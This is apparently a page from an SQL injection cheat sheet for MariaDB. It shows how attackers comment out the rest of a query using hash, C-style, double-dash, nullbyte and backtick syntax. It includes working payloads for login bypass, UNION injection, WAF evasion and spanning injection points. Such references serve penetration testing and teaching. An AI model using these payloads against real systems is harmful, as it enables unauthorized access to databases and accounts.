---
title: Comment Out Query
description: Techniques for commenting out the remainder of SQL queries in MariaDB
category: Basics
order: 3
tags: ["comments", "basics", "query manipulation"]
lastUpdated: 2025-12-18
---

The following methods can be used to comment out the rest of a query after your injection. MariaDB supports the same comment syntax as MySQL.

| Technique | Description     |
| --------- | --------------- |
| `#`       | Hash comment    |
| `/*`      | C-style comment |
| `-- -`    | SQL comment     |
| `;%00`    | Nullbyte        |
| `` ` ``   | Backtick        |

> **Note:** The first three entries (`#`, `/*`, `-- -`) are true SQL comment syntaxes. The `;%00` nullbyte is an application-level bypass that exploits string termination in languages like C/PHP. The backtick is an identifier-based technique that swallows trailing characters.

## Hash Comment (#)

Comments out everything from `#` to end of line:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 # ' AND password = ''
```

## C-Style Comment (/\*)

C-style comments span from `/*` to `*/`. Useful for inline obfuscation and when you control multiple injection points.

### Inline Obfuscation

Comments can replace whitespace to bypass WAF filters:

```sql
SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'
```

### Spanning Multiple Injection Points

Start a comment in one field and close it in another:

```sql
-- Injection: username = admin'/* and password = */ OR '1'='1
SELECT * FROM users WHERE username = 'admin'/*' AND password = '*/ OR '1'='1'
```

### Nested Comments

MariaDB does **NOT** support nested C-style comments:

```sql
SELECT /* outer /* inner */ 'visible' AS result
```

## SQL Comment (-- -)

The SQL standard comment `--` requires a space after the dashes. The `-- -` pattern (double-dash, space, dash) is commonly used because URL encoding can strip trailing spaces.

```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- -' AND password = ''
```

## Nullbyte (;%00)

The `;%00` technique is primarily an **application-level bypass** where the nullbyte terminates string processing in languages like C or PHP. In direct SQL, the semicolon simply ends the statement.

```sql
-- Application receives: SELECT * FROM users WHERE id = 1;%00 AND admin = 1
-- PHP/C may truncate at the nullbyte, effectively:
-- SELECT * FROM users WHERE id = 1;
```

## Backtick (\`)

The backtick can be used to end a query when used as an alias. It works by starting an identifier that swallows trailing characters.

```sql
-- Injection: UNION SELECT 1, 2`';
SELECT id, username FROM users WHERE id = 1 UNION SELECT 1, 2`'
```

## Important Notes

- Comments inside string literals are NOT treated as comments: `SELECT '# not a comment'`
- Multiple comment styles can be used in one query: `SELECT * /* c-style */ FROM users # hash`

## Injection Examples

### Login Bypass

```sql
-- Injection payload: admin'#
SELECT * FROM users WHERE username = 'admin'#' AND password = '...'
```

### UNION Injection

```sql
-- Injection: 999 UNION SELECT 1,'injected','x','y'#
SELECT id, username FROM users WHERE id = 999 UNION SELECT 1,'injected','x','y'#
```
